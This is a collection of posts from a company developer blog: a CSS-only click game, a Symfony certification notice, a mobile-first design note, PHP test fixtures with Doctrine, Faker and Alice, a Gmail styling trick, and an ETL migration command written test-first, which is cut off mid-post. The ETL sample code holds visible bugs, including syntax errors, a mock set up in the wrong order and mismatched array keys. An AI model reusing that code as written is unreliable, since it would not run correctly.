{"article": "\r\n\t\t\t\t\t\t\t\t\t\t<!--\n#content .storycontent h2,\n#content .storycontent h3 {\n\tmargin: 2em 0 1em;\n\tline-height: normal;\n}\n#content div.article .illustration {\n\tmargin: 0 auto;\n\tdisplay: block;\n}\n#content div.article p {\n\tmargin-bottom: 1em;\n\tline-height: 1.4em;\n}\n#content div.article pre {\n\tmargin-bottom: 1.4em;\n}\n#content div.article pre.error {\n\tcolor: #f00;\n}\n#content div.article pre .comment {\n\tcolor: #999;\n}\n.gimme-more {\n\tmax-height: 200px;\n\toverflow: hidden;\n\ttransition:max-height 1.2s;\n}\n.gimme-more:hover {\n\tmax-height: 900px;\n}\n.gimme-more:before {\n\tcontent: '\u2193 hover for more \u2193';\n\tdisplay: block;\n        padding-bottom: 2px;\n        border-bottom: 1px dashed #ccc;\n        margin-bottom: 10px;\n\ttext-align: center;\n        color: #aaa;\n}\n-->\nThe development of CSS3 and its improving support in \u201cmodern\u201d browsers brought us crazy JavaScript-free animations featuring gradients, rotations, 3D and way too many iStuff.\nThese visual experiments are certainly nice but I started searching for ways of adding interactivity to go one step further and make games using only CSS.\nThis is precisely when I stumbled upon Alex Walker\u2019s CSS3 Pong demo.\nIt may not be a real game but let\u2019s be clear: if it\u2019s a game you want to make, do not use CSS. However if you want to play with CSS and share the fun, it\u2019s ok!\nSo now we\u2019ll talk about the first (more incoming) game I made: Click Invaders.\n\nPseudo-classes as Events\nFor a first game I kept it simple and went for a basic mouse shooter.\nIn Click Invaders, you click an enemy to kill it.\nThe click event is easy to capture with JavaScript but not with a decoration language like CSS. Instead we\u2019ll use the :checked pseudo-class and style the normal and checked states of an input, here a checkbox.\nThat\u2019s right, in Click Invaders you are actually filling a form, not destroying monsters from outer space \ud83d\ude00\nSince we can\u2019t style checkboxes that much, the invader is going to be the label corresponding to the input via the for/id attributes.\n\nHTML\n<div class=\"invader one\">\r\n\t<input id=\"invader-one\" type=\"checkbox\" />\r\n\t<label for=\"invader-one\"></label>\r\n</div>\nCSS\n/* the red bean body */\r\n.invader label {\r\n\tdisplay: block;\r\n\twidth: 40px;\r\n\theight: 40px;\r\n\tline-height: 40px;\r\n\tpadding: 10px;\r\n\tbackground: red;\r\n\tborder-radius: 50%;\r\n\tbox-shadow: 0 0 20px red;\r\n}\r\n\r\n/* the eyes */\r\n.invader label:before,\r\n.invader label:after {\r\n\tcontent: '';\r\n\tdisplay: block;\r\n\tposition: absolute;\r\n\ttop: 16px;\r\n\twidth: 10px;\r\n\theight: 10px;\r\n\tbackground: yellow;\r\n\tborder-radius: 50%;\r\n}\r\n.invader label:before {left: 16px;}\r\n.invader label:after {right: 16px;}\r\n\r\n/* the input, hidden somewhere in a galaxy far away */\r\n.invader input {\r\n\tposition: absolute;\r\n\ttop: -9999px;\r\n\tleft: -9999px;\r\n}\nWhen we click the label, it triggers and checks the input. And when the input is checked, we hide the label, hence the invader disappears.\n/* R.I.P. */\r\n.invader input:checked + label {\r\n  display: none;\r\n}\nAdvanced selectors\nNotice the use of the adjacent sibling combinator (+). Inputs don\u2019t have children, therefore we can\u2019t do something like:\n/* impossible */\r\ninput:checked label {\r\n  display: none;\r\n}\nBut we can\u2019t target a parent tag either. So we need the label right after the input, on the same level, and use the + selector that does exactly this: target the next element.\nSo now we can make our enemies disappear. Not cool enough!\nWhat we want is to blast the hell out of every invader we kill: let\u2019s explode them!\nThe plan here is to hide the explosion and make it appear only after the kill (after the input is checked, that is).\n\nHTML\n<div class=\"invader one\">\r\n    <input id=\"invader-one\" type=\"checkbox\" />\r\n    <label for=\"invader-one\"></label>\r\n    <div class=\"explosion\"><span>Bam!</span></div>\r\n</div>\nCSS\n/* explosions are twelve-point-stars from www.css3shapes.com */\r\n.explosion .explosionBase {\r\n  width: 300px;\r\n  height: 300px;\r\n  background: yellow;\r\n  box-shadow: 0 0 20px yellow;\r\n  position: absolute;\r\n}\r\n\r\n.explosion:before,\r\n.explosion:after {\r\n  width: 300px;\r\n  height: 300px;\r\n  background: yellow;\r\n  box-shadow: 0 0 20px yellow;\r\n  position: absolute;\r\n  content: \"\";\r\n}\r\n.explosion:before {transform: rotate(30deg);}\r\n.explosion:after {transform: rotate(-30deg);}\r\n\r\n.explosion span {\r\n  position: absolute;\r\n  top: 130px;\r\n  left: 0;\r\n  z-index: 3;\r\n  display: block;\r\n  width: 300px;\r\n  height: 300px;\r\n  font-size: 48px;\r\n  text-align: center;\r\n  text-transform: uppercase;\r\n  user-select: none;\r\n}\r\n\r\n/* KABOOM baby */\r\n.invader input:checked ~ .explosion {\r\n  display: block;\r\n}\nIn essence, that\u2019s exactly the same as we\u2019ve seen before except we use the general sibling combinator (~).\nIt is a more powerful version of the + selector that can target any element positioned after the first element and at the same level.\nIn that regard, wrapping my invaders inside a div.invader was actually a bad idea since the more \u201cflat\u201d your HTML structure is, the more efficient your selectors will be.\nAnimations\nThat does look better but at this point we\u2019re lacking something essential: those invaders, they need to fly!\nChances are that you are already familiar with CSS3 animations yet I think one important reminder is due: IE9 don\u2019t handle them.\nTo be honest, I had initially planned to have a distinct flying animation for each invader (there are 5) but I got lazy so I settled for one zigzag animation and applied different delay and direction values:\nCSS\n.invader label {\r\n\t/* name, duration, iteration (same for all invaders) */\r\n\tanimation: fly 14s infinite;\r\n}\r\n\r\n.invader.three label {\r\n\t/* specific delay and direction */\r\n\tanimation-delay: 3s;\r\n\tanimation-direction: alternate, normal;\r\n}\r\n\r\n/* position and deformation at different steps */\r\n@keyframes fly {\r\n\t0% {\r\n\t\ttop: 0;\r\n\t\tleft: -20%;\r\n\t\tpadding: 0 20px;\r\n\t}\r\n\t25% {\r\n\t\ttop: 40px;\r\n\t\tleft: 120%;\r\n\t\tpadding: 10px;\r\n\t}\r\n\t50% {\r\n\t\ttop: 30%;\r\n\t\tleft: -20%;\r\n\t\tpadding: 0 20px;\r\n\t}\r\n\t75% {\r\n\t\ttop: 50%;\r\n\t\tleft: 120%;\r\n\t\tpadding: 10px;\r\n\t}\r\n\t100% {\r\n\t\ttop: 80%;\r\n\t\tleft: -20%;\r\n\t\tpadding: 0 20px;\r\n\t}\r\n}\nTo infinity and beyond!\nHere we are, we have reached a point where we can actually say that we build a \u201cgame\u201d.\nGranted, it\u2019s not a very interesting game but I warned you earlier^^\nClick Invaders also features Start screen, a timer and more decorative elements such as stars, buildings and lights.\nIt can (and will) be largely improved using various CSS tricks though most of it should follow the following formula: pseudo-class + selector + animation.\nKeep in mind that CSS3 is in constant evolution and so is its actual support in browsers so you\u2019ll probably need to use prefixes (-webkit-, -moz-, -o-, -ms-) when implementing uncommon CSS3 properties.\nTo help you with that I advise you use prefixfree or a CSS preprocessor like LESS.\nOther resources: Can I use\u2026, Taming Advanced CSS Selectors, Mozilla Developer Network.\nHopefully the things we\u2019ve seen are not limited to CSS games. For instance, it can be used to replace some minor JavaScript effects just like I did in this very article with the \u201chover for more\u201d blocks that use the :hover pseudo-class, or custom ON/OFF switches.\nThanks for reading, I\u2019ll make sure to keep you updated!\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tCyrille Jouineau\r\n  \t\t\t\r\n  \t\t\t\tCyrille Jouineau - a longtime Theodoer, Cyrille has worked with every version of Symfony and specializes in front-end development (HTML5, CSS3, Twig)  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tWe are happy to announce that Matthieu and Thierry are now SensioLabs Certified Symfony Developers.\nCongratulations for both of them!\nThis makes us the first company after Sensio to have 5 certified developers, and we hope that soon other teammates will join them!\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tMarek Kalnik\r\n  \t\t\t\r\n  \t\t\t\tMarek Kalnik - a Technical Team Manager working with us since 2010 - is a PHP and JavaScript passionate. His main centers of interests include: Symfony 2, object-oriented JavaScript, code quality and good practices.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\t<!--\n#content .storycontent h2,\n#content .storycontent h3 {\n\tmargin: 2em 0 1em;\n\tline-height: normal;\n}\n#content .storycontent ol li {\n\tlist-style-type: decimal;\n}\n#content div.article .illustration {\n\tmargin: 0 auto;\n\tdisplay: block;\n}\n#content div.article p {\n\tmargin-bottom: 1em;\n\tline-height: 1.4em;\n}\n#content div.article pre {\n\tmargin-bottom: 1.4em;\n}\n#content div.article pre.error {\n\tcolor: #f00;\n}\n#content div.article pre .comment {\n\tcolor: #999;\n}\n.gimme-more {\n\tmax-height: 200px;\n\toverflow: hidden;\n\ttransition:max-height 1.2s;\n}\n.gimme-more:hover {\n\tmax-height: 900px;\n}\n.gimme-more:before {\n\tcontent: '\u2193 hover for more \u2193';\n\tdisplay: block;\n        padding-bottom: 2px;\n        border-bottom: 1px dashed #ccc;\n        margin-bottom: 10px;\n\ttext-align: center;\n        color: #aaa;\n}\n-->\nA short note on a situation that I fear is becoming more and more common:\nYou\u2019ve just been presented a wonderful website by an enthusiastic client, soooo proud of the time spent with a designer to validate the templates for all pages of the site, when the following is thrown in as a conclusion: \u201cOh and make it responsive, you know\u201d.\nWe know, but they don\u2019t. Responsive isn\u2019t magic, you don\u2019t make a website responsive by snapping fingers or switching on some buttons.\nI guess the appropriate reply to that would be \u201cOk, how do you picture the site on a mobile device?\u201d and see the look on your client\u2019s face when they understand they have to go through the same design/validation loops again.\nAs my new rule of thumb (the former was \u201cThink Google\u201d), I say websites should first be designed with mobile in mind, and then extended to desktop versions.\nDesigning \u201cmobile first\u201d has many benefits, such as:\n\ncore features are better identified and simplified\nthe need for small, visual elements reduces the amount of confusing noise\nthe site can still be used on a dekstop computer, requiring minimal adjustments\nsmall assets and CSS3 are privileged\n\nRemember it\u2019s easier to extend than it is to restrict, and this makes the approach a lot more \u201cAgile friendly\u201c, prioritising on what\u2019s important.\nNext step could well be to join the \u201cNoPSD\u201d movement. Since CSS3 is admirably suited for mobile design, we could hand the design over to the front-end developer alone\u2026 provided that the guy\u2019s creativity is not limited. But that\u2019s another story.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tCyrille Jouineau\r\n  \t\t\t\r\n  \t\t\t\tCyrille Jouineau - a longtime Theodoer, Cyrille has worked with every version of Symfony and specializes in front-end development (HTML5, CSS3, Twig)  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tDealing with data developing a new application is a real challenge for the development team. You often need them to develop and then test your app. For example, for a login system, you would need different users with roles and permissions in the database in order to test that the configuration is well set. To build a list of books, you would need books with author, title, description, picture and so on. In the end developers will need to create many fixtures to be able to test what they are developing.\nWhen you are working on a fresh new project, you will create fake data. However, if you are working on an existing application, you may use a recent snapshot taken from the database on the production server. This way you will have data on your pages when you launch the application locally. But as far as tests are concerned, this can be problematic. When you write tests, you want them to stay independent of each other to avoid weird behaviors. Thus, to be sure that you will not have any problems, most of the time, you would reload the database with a set of data used by the test. So, loading the whole snapshot on each test will slow your tests down and you won\u2019t run them as often as you should do (not to say never). Therefore you should use data fixtures.\nFurthermore, fixtures will be of great help when you want to provide your Product Owner with test data after you deployed a new feature on the test server. It is the best way for you to make him able to see the result of your hard work quickly and easily.\nI will try to show you some of the tools we use at Theodo.\n\nDoctrine Fixtures\nDoctrine fixtures is a PHP library that loads a set of data fixtures fully written in PHP. Creating a fixtures file is simple, you only have to create a PHP class that implements the FixtureInterface and instantiate as many object as you want to store.\nclass LoadUserData implements FixtureInterface\r\n{\r\n    public function load(ObjectManager $manager)\r\n    {\r\n        $user = new User();\r\n        $user->setUsername(\"benja-M-1\");\r\n\r\n        $manager->persist($user);\r\n        $manager->flush();\r\n    }\r\n}\nMoreover, you can share objects between fixtures that ease the creation of\nrelation between your entities. If you want to have more information about\ndoctrine fixtures you should read the documentation from the\ngithub repository. In a Symfony2 project, you can install the Doctrine fixtures library adding the DoctrineFixturesBundle in your composer.json file and registering the bundle in your AppKernel class.\n\n\nGenerating fake content\nSometimes you have to write fake data which can be a boring task. For example you want to provide a content for a blog post, but it could be written in latin, chinese, brainfuck, you don\u2019t care. Faker is the perfect tool for that. It is a fake data generator that allows you to create fake text content, username, emails, urls, locations, etc. Here is a small and simple example:\nclass LoadUserData implements FixtureInterface\r\n{\r\n    public function load(ObjectManager $manager)\r\n    {\r\n        $faker = Faker\\Factory::create();\r\n\r\n        $user = new User();\r\n        $user->setFirstname($faker->firstname);\r\n        $user->setLastname($faker->lastname);\r\n\r\n        $manager->persist($user);\r\n        $manager->flush();\r\n    }\r\n}\n\n\nAlice without Bob\nWriting your fixtures with PHP can quickly be a problem: you will have to write a huge amount of code, even many files. To reduce this pain you should use Alice.\nAlice is a PHP fixtures generator that allows you to load fixtures from PHP or Yaml files easily. Here is a snippet of code that loads some data fixtures from a Doctrine Fixtures class:\nclass LoadUserData implements FixtureInterface\r\n{\r\n    public function load(ObjectManager $manager)\r\n    {\r\n        // load objects from a yaml file\r\n        $loader = new \\Nelmio\\Alice\\Loader\\Yaml();\r\n        $objects = $loader->load(__DIR__.'/users.yml');\r\n\r\n        $persister = new \\Nelmio\\Alice\\ORM\\Doctrine($manager);\r\n        $persister->persist($objects);\r\n    }\r\n}\n# users.yml\r\nMyProject\\User:\r\n    user_1:\r\n        firstName: \"Benjamin\"\r\n        lastName:  \"Grandfond\"\r\n        username:  \"benja-M-1\"\r\n        email:     \"benjaming@theodo.fr\"\nAs you can see, creating and loading data is easy and will save you a lot of time, but it can be even easier:\nclass LoadUserData implements FixtureInterface\r\n{\r\n    public function load(ObjectManager $manager)\r\n    {\r\n        Fixtures::load(__DIR__.'/users.yml', $manager);\r\n    }\r\n}\nFurthermore, you can generate a range of data with a simple notation to avoid duplication in your yaml files. For example, to generate 50 users you can do this:\n# users.yml\r\nMyProject\\User:\r\n    user_{1..50}:\r\n        firstName: \"Benjamin\"\r\n        lastName:  \"Grandfond\"\r\n        username:  \"benja-M-1\"\r\n        email:     \"benjaming@theodo.fr\"\nLast but not least Alice natively integrates Faker, so you can write bunch of fake data in few lines of Yaml:\n# users.yml\r\nMyProject\\User:\r\n    user_{1..50}:\r\n        firstName: <firstName()>\r\n        lastName:  <lastName()>\r\n        username:  <username()>\r\n        email:     <email()>\n\n\nUse SQL in your fixtures\nGenerally, you use Doctrine fixtures to load entities mapped in your Doctrine2 application and with Alice and Faker, why would you use SQL to create fixtures? Working with a legacy project you may need to load data that are not mapped in your fresh new Symfony2 app. Don\u2019t forget that fixtures classes are written in PHP code so you can do whatever you want! By the way, you can access the EntityManager (or DocumentManager if you work with the ODM), so you are able to execute any SQL statement:\nclass LoadUserData implements FixturesInterface\r\n{\r\n    public function load(ObjectManager $manager)\r\n    {\r\n        // ... lot of stuff done before\r\n\r\n        $connection = $manager->getConnection();\r\n\r\n        $userId = $connection->fetchColumn(\"SELECT id FROM sf_guard_user WHERE username like '%benjaming%'\");\r\n        $groupId = $connection->fetchColumn(\"SELECT id FROM sf_guard_group WHERE name like 'theodoer'\");\r\n\r\n        $connection->exec(\"INSERT INTO sf_guard_user_group (user_id, group_id) VALUES($userId, $groupId)\");\r\n    }\r\n}\n\n\nWhat about pictures?\nIn my recent project, users were managed by a symfony 1 application and\npictures were stored inside its /web/uploads/users/avatar folder. I wanted to have some fake pictures in the list of users written with Symfony2, but I wrote the fixtures inside Symfony2 and I could not add the fake fixtures inside the upload folder as it was not versioned (hopefully\u2026). Then the only solution that I found was to copy the files once the fixtures were loaded, but how?\nOnce again, they are written in PHP files, thus I can find these files and copy them where I want! Furthermore, implementing the ContainerAwareInterface I can access the Symfony2 container.\nclass LoadUserData implements FixturesInterface, ContainerAwareInterface\r\n{\r\n    public function load(ObjectManager $manager)\r\n    {\r\n        // ... lot of stuff done before\r\n\r\n        // Copy images into the legacy application\r\n        $fs = $this->container->get('filesystem');\r\n        $legacyPath = $this->container->getParameter('legacy_path').'/web/uploads';\r\n        $basePath = __DIR__.'/../Files';\r\n\r\n        $finder = \\Symfony\\Component\\Finder\\Finder::create()\r\n            ->files()\r\n            ->in($basePath)\r\n            ->ignoreDotFiles(true)\r\n            ->ignoreVCS(true)\r\n        ;\r\n\r\n        foreach ($finder as $file) {\r\n            if ($file->isFile()) {\r\n                $newFile = str_replace($basePath, $legacyPath, $file->getPathname());\r\n                $fs->copy($file->getPathname(), $newFile);\r\n            }\r\n        }\r\n    }\r\n}\nWith this solution every time I run the php app/console doctrine:fixtures:load command I have new users with their own pictures and the right sfGuardUserGroup associated. Adding the --append option to the command you can keep existing data loaded from the snapshot of your production server!\nTo conclude, if you don\u2019t use fixtures in your project, then you should. It is the easiest way to test your development and getting feedback about what your are doing. Also, you should take as much care of your fixtures code as your production code or testing code because you will have to maintain them and may need to reuse them from one test case to another.\n\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tBenjamin Grandfond\r\n  \t\t\t\r\n  \t\t\t\tBenjamin Grandfond - He is \"Technical Team Manager\". Symfony and PHP expert, he likes when you write your tests first and then code. His main interests are Code Quality, best practices, REST architecture and building great new PHP applications over old ones.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tThis blog post is in French as the event it relates to is French-only.\nA l\u2019occasion du Symfony Live Paris 2012, j\u2019ai eu la chance de pouvoir faire une pr\u00e9sentation o\u00f9 j\u2019explique comment faire du Test-Drivent Development (TDD) dans un projet Symfony2 dont les slides sont disponibles sur speakerdeck. Pour ceux qui n\u2019ont pas eu l\u2019occasion d\u2019y assister ou souhaitent la revoir, les vid\u00e9os du Symfony Live sont enfin sorties !\n\nIl y avait aussi beaucoup d\u2019autres conf\u00e9rences int\u00e9ressantes que vous pouvez voir directement sur la cha\u00eene Youtube de Sensiolabs.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tBenjamin Grandfond\r\n  \t\t\t\r\n  \t\t\t\tBenjamin Grandfond - He is \"Technical Team Manager\". Symfony and PHP expert, he likes when you write your tests first and then code. His main interests are Code Quality, best practices, REST architecture and building great new PHP applications over old ones.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tHave you ever wanted to look at your GMail Inbox to find some information in an old email\u2026 but without being disturbed by all these new emails that will inevitably draft you away from your current focus and destroy your productivity?\nAt Theodo, we have found a really simple way to do just that! It is a trick based on Stylish to hide all unread emails on demand.\nFirst install the Stylish extension for your favorite browser :\n\nthe Chrome extension: https://chrome.google.com/webstore/detail/stylish/fjnbnpbmkenffdnngjfgmeleoegfcffe\nthe Firefox extension: https://addons.mozilla.org/en-US/firefox/addon/stylish/\n\nAnd then create a new \u201cstyle\u201d that you call \u201cGmail pause\u201d:\n\n    .zE { display: none; }\r\n    .n1 a[title^=Inbox] {\r\n      font-weight: normal !important;\r\n      width: 2.5em;\r\n      padding: 0;\r\n      display: inline-block;\r\n      overflow: hidden;\r\n    }\n\nYou can then hide or see your unread emails at will, using the small \u201cS\u201d icon in the top-right corner.\nI hope it will be as revolutionary for your productivty as it was for me!\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tFabrice Bernhard\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tWhen you manage data on a regular basis, it can be very useful to write a\ncommand to facilitate this repetitive tasks. The crude way to do it would\nbe to let the command do the job alone. But this isn\u2019t a clean way to\ndo it. Why? Because you wouldn\u2019t be able to write a test for your command.\nIt would be a black box that interact with some critical component of your\nproject. There is a solution: using ETL services in your command, and that\u2019s\nwhat we\u2019re are going to show you here.\nUsing ETL services means defining 3 services: an extractor to get the data\nfrom a source, a transformer to adapt the data to its new use and a loader\nto update or create the data in the target, each services passing the data\nto the next one.\nOf course this method has a wide range of application, from editing files\nto migrating database or importing/exporting data. As example I\u2019ll handle\nthe migration of article from a blog: my article are in a legacy mysql\ndatabase, they contain a content and an author id that link them to an user\nand I have already migrated the user and stored their legacy id. I choose\nto use raw SQL for performance issue but this would also work with ORM.\n\nCommand\nBecause I use ETL I already know how the command will work:\n\nI start by loading the 3 services.\nI extract the data using an extract() method from the extractor.\nI\u2019ll load a row of data to process with nextRow. The row will be put in a parameter bag.\nWhile there is rows to process I try to iterate the following:\nTransforming the data with a transform($data) method from the transformer.\nLoading the data with a load($data) method from the loader.\nOutputing a nice success message and go on to the next row.\nIf this process fail, I catch the error and output a faillure message. Then I go on to the next row.\n\nI chose to extract the data piece by piece instead of all in one shoot to\nuse less memory. It also allows me to log some information of the migration\nas it goes on, even in the case of a failure. If something goes wrong with\na piece of data (for example the author of an article cannot be found in the\nnew database), the transformer or the loader will throw an exception with\nan explicit message.\nNow that I know what process I expect, I can write the command before writing\nany problem specific code.\nclass MigrateArticleCommand extends Command\r\n{\r\n        protected function configure()\r\n        {\r\n                $this->setName('migration:article')\r\n        }\r\n\r\n        protected function execute(InputInterface $input, OutputInterface $output)\r\n        {\r\n                $container = $this->getContainer();\r\n\r\n                $extractor = $container->get('extractor.article');\r\n                $transformer = $container->get('transformer.article');\r\n                $loader = $container->get('loader.article');\r\n\r\n                $extractor->extract();\r\n\r\n                while ($article = $extractor->nextRow()) {\r\n                        try {\r\n                                $transformer->transform($article);\r\n                                $loader->load($article);\r\n                                $this->output->writeln('<info>[Success]  Article #'.$article->getLegacyId().' migrated</info>');\r\n                        } catch (\\Exception $e) {\r\n                                $this->output->writeln('<error>[Failure] '.$e->getMessage().'</error>');\r\n                        }\r\n                }\r\n        }\r\n}\n\n\nExtractor in TDD\nLet\u2019s write the extractor TDD style using Phake.\nAt first I have to make sure I execute the right query. I write a test for\nit.\nclass ArticleExtractorTest extends \\PHPUnit_Framework_TestCase\r\n{\r\n        private $extractor;\r\n        private $connection;\r\n        private $statement;\r\n\r\n        public function setUp()\r\n        {\r\n                $this->extractor = new ArticleExtractor($this->connection);\r\n                $this->connection = Phake::mock('Doctrine\\DBAL\\Connection');\r\n                $this->statement = Phake::mock('Doctrine\\DBAL\\Driver\\PDOStatement');\r\n                Phake::when($this->connection)->executeQuery(Phake::anyParameters())->thenReturn($this->statement);\r\n        }\r\n\r\n        /**\r\n         * Test if the right queries happen using some regex\r\n         */\r\n        public function testQueries()\r\n        {\r\n                $this->extractor->extract();\r\n\r\n                $regexArray[] = '#SELECT.*FROM articles#is'; //I do a select in the right table\r\n                $regexArray[] = '#AS author_legacy_id#is'; //I get the author legacy id\r\n                $regexArray[] = '#AS content#is'; //I get the content\r\n                // I could define more regex if I use a more complex query\r\n\r\n                Phake::verify($this->connection, Phake::times(1))->executeQuery(Phake::capture($query));\r\n                //I have tested that I did only one query and captured it\r\n\r\n                foreach($regexArray as $regex) {\r\n                        $this->assertRegExp($regex, $query);\r\n                }\r\n        }\r\n}\nWith this test as starter, I can begin writing the actual functionnal\ncode.\nclass ArticleExtractor\r\n{\r\n        private $connection;\r\n        private $statement;\r\n\r\n        public function __construct(\\Doctrine\\DBAL\\Connection $connection)\r\n        {\r\n                $this->connection = $connection;\r\n        }\r\n\r\n        public function extract()\r\n        {\r\n                $this->statement = $this->connection->executeQuery($this->getQuery());\r\n        }\r\n\r\n        private function getQuery()\r\n        {\r\n                return 'SELECT article_content AS content, author_id AS author_legacy_id, id AS legacy_id FROM articles';\r\n        }\r\n}\nI now add the following tests about the expected result:\nclass ArticleExtractorTest extends \\PHPUnit_Framework_TestCase\r\n{\r\n        // [...]\r\n\r\n        /**\r\n         * Test if the paramerter bag is correctly set when some data are extracted using a dataprovider\r\n         * @dataProvider providerDummyStatementFetch\r\n         */\r\n        public function testResult($data)\r\n        {\r\n                Phake::when($this->statement)->fetch()->thenReturn($data);\r\n                $this->extractor->extract();\r\n\r\n                $result = $this->extractor->nextRow();\r\n                $this->assertTrue($result instanceof Article);\r\n                $this->assertEquals($data['content'], $result->getContent());\r\n                $this->assertEquals($data['author_legacy_id'], $result->getAuthorLegacyId());\r\n        }\r\n\r\n        /**\r\n         * Data provider\r\n         */\r\n        public function providerDummyStatementFetch()\r\n        {\r\n                return array(\r\n                        array('legacy_id' => 1, 'author_legacy_id' => 1, 'content' => 'should be ok'),\r\n                );\r\n        }\r\n}\nI add the nextRow() method to my Extractor:\nclass ArticleExtractor\r\n{\r\n        // [...]\r\n\r\n        public function nextRow()\r\n        {\r\n                if ($data = $this->statement->fetch()) {\r\n                        $result = new Article();\r\n                        $result->hydrate($data)\r\n\r\n                        return $result;\r\n                }\r\n\r\n                return null;\r\n        }\r\n}\nAnd the associated parameter bag for the result:\nclass Article\r\n{\r\n        private $authorLegacyId;\r\n        private $content;\r\n        private $legacyId;\r\n\r\n        //Write the getter and setter\r\n\r\n        public function hydrate($data)\r\n        {\r\n                $this->setContent($data['content']);\r\n                $this->setLegacyId($data['legacyId']);\r\n                $this->setAuthorLegacyId($data['authorLegacyId']));\r\n        }\r\n}\nThats good but what should happen if the fetched data are incorrect? I add 2\ntest cases to my data provider. One with an empty content and an other with a\nnegtiv id. I expect an error.\nclass ArticleExtractorTest extends \\PHPUnit_Framework_TestCase\r\n{\r\n        // [...]\r\n\r\n        /**\r\n         * Test if the paramerter bag is correctly set when some data are extracted using a dataprovider\r\n         * @dataProvider providerDummyStatementFetch\r\n         */\r\n        public function testResult($data)\r\n        {\r\n                Phake::when($this->statement)->fetch()->thenReturn($data);\r\n                $this->extractor->extract();\r\n\r\n                try {\r\n                        $result = $this->extractor->nextRow();\r\n                        $this->assertTrue($result instanceof Article);\r\n                        $this->assertEquals($data['content'], $result->getContent());\r\n                        $this->assertEquals($data['author_legacy_id'], $result->getAuthorLegacyId());\r\n                } catch (\\Exception $e) {\r\n                        if ($data['legacy_id'] == -1) {\r\n                                $this->assertEquals($e->getMessage(), 'Invalid legacy id')\r\n                        }\r\n                        if ($data['author_legacy_id'] == -1) {\r\n                                $this->assertEquals($e->getMessage(), 'Invalid author legacy id')\r\n                        }\r\n                        if ($data['content'] == '') {\r\n                                $this->assertEquals($e->getMessage(), 'Invalid content')\r\n                        }\r\n                }\r\n        }\r\n\r\n        /**\r\n         * Data provider\r\n         */\r\n        public function providerDummyStatementFetch()\r\n        {\r\n                return array(\r\n                        array('legacy_id' => 1,  'author_legacy_id' => 1,  'content' => 'should be ok'),\r\n                        array('legacy_id' => -1, 'author_legacy_id' => 3,  'content' => 'negativ id error'),\r\n                        array('legacy_id' => 1,  'author_legacy_id' => -1, 'content' => 'negativ author id error'),\r\n                        array('legacy_id' => 1,  'author_legacy_id' => 3,  'content' => ''),\r\n                );\r\n        }\r\n}\nThe parameter bag should check the validity of the data, I edit its\nhydrate method:\nclass Article\r\n{\r\n        // [...]\r\n\r\n        public function hydrate($data)\r\n        {\r\n                if (!isset($data['content']) OR empty($data['content'])) {\r\n                        throw new \\InvalidArgumentException('Invalid content');\r\n                }\r\n                if (!isset($data['authorLegacyId']) OR $data['authorLegacyId'] < 1) {\r\n                        throw new \\InvalidArgumentException('Invalid author legacy id');\r\n                }\r\n                if (!isset($data['legacyId']) OR $data['legacyId'] < 1) {\r\n                        throw new \\InvalidArgumentException('Invalid legacy id');\r\n                }\r\n\r\n                $this->setContent($data['content']);\r\n                $this->setLegacyId($data['legacyId']);\r\n                $this->setAuthorLegacyId($data['authorLegacyId']));\r\n        }\r\n}\nAnd that\u2019s all. I have an Extractor, a parameter bag and tests for it.\nAll I have to do now is to define this class as a service. There are multiple\nways to do it, just follow the book. Don\u2019t forget to add a connection to the\nlegacy database as parameter.\n\n\nTransformer and Loader\nThe process for 